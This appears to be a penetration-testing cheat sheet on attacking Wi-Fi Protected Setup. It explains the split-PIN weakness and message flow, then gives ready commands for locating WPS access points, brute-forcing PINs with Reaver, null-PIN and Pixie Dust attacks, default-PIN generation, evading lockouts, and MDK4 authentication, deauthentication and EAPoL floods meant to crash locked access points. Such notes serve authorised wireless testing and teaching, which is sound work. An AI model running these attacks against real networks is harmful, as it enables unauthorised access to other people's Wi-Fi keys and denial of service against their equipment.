---
title: WPS
---

# WPS

## WPS Weaknesses

WPS (Wi-Fi Protected Setup) allows devices to connect using an 8-digit PIN instead of a password. The PIN is validated in **two separate parts**:

- **First half (PSK1)** : 4 digits (10,000 combinations)
- **Second half (PSK2)** : 3 digits + 1 checksum (1,000 combinations)

**Why it's broken** : The AP validates each half independently. Total attempts needed : **11,000** instead of 100,000,000.

::: tip PIN Splitting
The AP sends two hashes (E-Hash1, E-Hash2) in message M3. If the first half is wrong, the AP responds with a NACK after M4. If the first half is correct but the second half is wrong, the NACK comes after M6. This allows an attacker to brute-force each half separately.
:::

::: details Message Flow

```php
[Client]                               [AP]
   |                                     |
   |------ EAPOL-Start ----------------->|
   |<----- EAP Request Identity ---------|
   |------ EAP Response Identity ------->|
   |<----- M1 (PKe) ---------------------|
   |------ M2 (PKr) -------------------->|
   |<----- M3 (E-Hash1, E-Hash2) --------|
   |------ M4 (R-Hash1, R-Hash2) ------->|
   |<----- M5 (E-S1 encrypted) ----------|
   |------ M6 (R-S1 encrypted) --------->|
   |<----- M7 (E-S2 + WPA-PSK) ----------|
   |------ M8 (confirmation) ----------->|
   |                                     |
   [ PIN valid → WPA-PSK disclosed ]
```

:::

## Reconnaissance

### Find WPS-Enabled APs

::: code-group

```bash [airodump-ng]
airodump-ng --wps $interface
```

```bash [wash]
# more WPS-specific
wash -i $interface
wash -i $interface -j # more details
```

:::

Key information to check:

- Locked status : Locked means the AP is temporarily blocking WPS attempts
- WPS version : older versions are more vulnerable
- Manufacturer : some vendors have known default PIN patterns

## Vendor Lookup

```bash
grep -i "AA-BB-CC" /var/lib/ieee-data/oui.txt
```

## Attacks

### Online Brute-Force (Reaver)

::: tip
Reaver acts as an external registrar and tries PINs sequentially. Because of the split-PIN flaw, it only needs `~11,000` attempts.
:::

```bash
reaver -i $interface -b $bssid -c $channel -vv
```

### With known first half

```bash
reaver -i $interface -b $bssid -c $channel -p 1234 -vv
```

### Null PIN attack (some APs accept an empty PIN) :

```bash
# Null PIN attack (-p "" or -p "")
reaver -i $interface -b $bssid -c $channel -p "" -vv
```

### Retrieve WPA key from known PIN :

```bash
reaver -i $interface -b $bssid -p $pin
```

## Phantom Locks & Rate Limiting

Some APs return false "locked" messages due to bugs or interference. Reaver can ignore them:

```bash
reaver -i $interface -b $bssid -c $channel -L -vv

-N           # Do not send NACK return back messages
-d <seconds> # Set the delay between pin attempts 1
-T <seconds> # Set the M5/M7 timeout period 0.40
-r <x:y>     # Sleep for y seconds every x pin attempts
```

### Force Reboot (MDK4)

If the AP is locked, you can try to crash it and force a reboot. When it comes back, WPS is often unlocked again.

```bash
# Authentication DoS
mdk4 $interface a -a $bssid

# Deauthentication flood
mdk4 $interface d -c $channel

# EAPoL-Start flood
mdk4 $interface e -t $bssid
```

## Pre-Defined PINs (Default Algorithms)

Many vendors use predictable PINs based on the MAC address or other hardware identifiers.

- [wpspin](https://github.com/epicdev420/WPSPin)
- [WPS-PIN generator (MAC-based)](https://github.com/linkp2p/WPS-PIN)

```bash
# Generate candidate PINs from BSSID
wpspin -A $bssid
```

- [pin_guesser.sh](/assets/pin_guesser.sh) - a simple script to test all wpspin generated PINs.

For specific vendors:

- [Vodafone EasyBox](https://github.com/eye9poob/Default-wps-pin)
- [Livebox 2.1](https://github.com/kcdtv/nmk)

## Pixie Dust Attack

::: tip
Some chipsets (Ralink, MediaTek, Broadcom, Realtek) use weak random number generators for the nonces (E-S1, E-S2). Instead of brute-forcing PINs, we compute them directly.
:::

::: code-group

```bash [reaver]
reaver -i $interface -b $bssid -c $channel -K 1 -vv
```

```bash [oneShot]
# no monitor mode required
# Install
sudo apt install python3 wpasupplicant iw pixiewps
wget https://raw.githubusercontent.com/fulvius31/OneShot/master/oneshot.py

# Run
sudo python3 oneshot.py -i $interface -b $bssid -K
```

:::

## Push Button Configuration (PBC)

If you have physical access to the AP, you can use WPS PBC to connect without the PIN.

::: code-group

```bash [Unix]
# With wpa_cli
wpa_cli wps_pbc $bssid
dhclient $interface
```

```bash [oneShot]
sudo python3 oneshot.py -i $interface --pbc
```

:::
